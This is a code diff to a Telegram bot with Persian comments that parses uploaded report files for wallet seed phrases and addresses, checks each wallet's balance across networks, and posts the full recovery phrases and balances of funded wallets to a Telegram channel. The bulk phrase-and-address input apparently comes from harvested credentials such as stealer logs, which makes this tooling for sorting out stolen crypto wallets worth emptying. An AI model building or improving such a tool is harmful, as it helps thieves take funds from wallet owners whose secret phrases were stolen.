@@ -45,52 +45,70 @@ async def process_report_file(update: Update, context: ContextTypes.DEFAULT_TYPE
     content_bytes = await file.download_as_bytearray()
     content = content_bytes.decode('utf-8', errors='ignore')
 
-    # استخراج عبارت‌ها و آدرس‌ها با الگوی جدید (تطبیق با فایل ارسالی شما)
     phrases = re.findall(r"Phrase:\s*(.*?)\s*(?:\[|Addr:|$)", content, re.DOTALL)
     addresses = re.findall(r"Addr:\s*(0x[a-fA-F0-9]{40})", content)
 
     wallets = list(zip(phrases, addresses))
     
     if not wallets:
-        await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=f"❌ در فایل `{doc.file_name}` هیچ کیف پولی یافت نشد.")
+        await context.bot.send_message(
+            chat_id=REPORT_CHANNEL_ID,
+            text=f"❌ در فایل `{doc.file_name}` هیچ کیف پولی یافت نشد.",
+            parse_mode='Markdown'
+        )
         return
 
-    total_summary = {net: 0.0 for net in NETWORKS.keys()}
+    total_balance_all = 0.0  # 👈 جمع کل همه شبکه‌ها
     rich_details = ""
-    any_balance = False
 
     for phrase, addr in wallets:
         clean_phrase = phrase.strip().replace('\n', ' ')
         assets = check_all_balances(addr)
-        
+
+        wallet_total = 0.0
+
         if assets:
-            any_balance = True
-            wallet_info = f"\n💎 **Rich Wallet Found:**\n🔑 `{clean_phrase}`\n📍 `{addr}`\n"
+            wallet_info = f"\n💎 **کیف پول دارای موجودی:**\n"
+            wallet_info += f"🔑 Phrase:\n`{clean_phrase}`\n"
+            wallet_info += f"📍 Address: `{addr}`\n"
+
             for asset in assets:
-                total_summary[asset['network']] += asset['amount']
-                wallet_info += f"   - {asset['network']}: `{asset['amount']:.6f}`\n"
+                wallet_total += asset['amount']
+                total_balance_all += asset['amount']
+
+                wallet_info += f"🌐 {asset['network']} → `{asset['amount']:.6f}`\n"
+
+            wallet_info += f"💰 مجموع این کیف: `{wallet_total:.6f}`\n"
+            wallet_info += "-------------------------\n"
+
             rich_details += wallet_info
 
-    # --- ساخت پیام نهایی ---
+    # --- گزارش نهایی (حتی اگر صفر باشد) ---
     summary_msg = f"📂 **File:** `{doc.file_name}`\n"
-    summary_msg += f"🔢 Wallets: {len(wallets)}\n"
-    summary_msg += "💰 **Total File Balance:**\n"
-    
-    for net, total in total_summary.items():
-        summary_msg += f"   - {net}: `{total:.6f}`\n"
+    summary_msg += f"🔢 تعداد کیف‌ها: {len(wallets)}\n"
+    summary_msg += f"💰 **مجموع کل همه کیف‌ها:** `{total_balance_all:.6f}`\n"
 
-    # ارسال گزارش جمع کل (حتی اگر صفر باشد)
-    await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=summary_msg, parse_mode='Markdown')
+    await context.bot.send_message(
+        chat_id=REPORT_CHANNEL_ID,
+        text=summary_msg,
+        parse_mode='Markdown'
+    )
 
-    # ارسال جزئیات کیف‌های پول‌دار (اگر وجود داشتند)
-    if any_balance:
-        # اگر متن خیلی طولانی بود، تکه تکه ارسال شود
+    # --- ارسال جزئیات کیف‌های دارای موجودی ---
+    if rich_details:
         if len(rich_details) > 4000:
             for i in range(0, len(rich_details), 4000):
-                await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=rich_details[i:i+4000], parse_mode='Markdown')
+                await context.bot.send_message(
+                    chat_id=REPORT_CHANNEL_ID,
+                    text=rich_details[i:i+4000],
+                    parse_mode='Markdown'
+                )
         else:
-            await context.bot.send_message(chat_id=REPORT_CHANNEL_ID, text=rich_details, parse_mode='Markdown')
-
+            await context.bot.send_message(
+                chat_id=REPORT_CHANNEL_ID,
+                text=rich_details,
+                parse_mode='Markdown'
+            )
 if __name__ == '__main__':
     keep_alive() # اجرای وب‌سرویس از فایل keep_alive.py
     application = ApplicationBuilder().token(BOT_TOKEN).build()
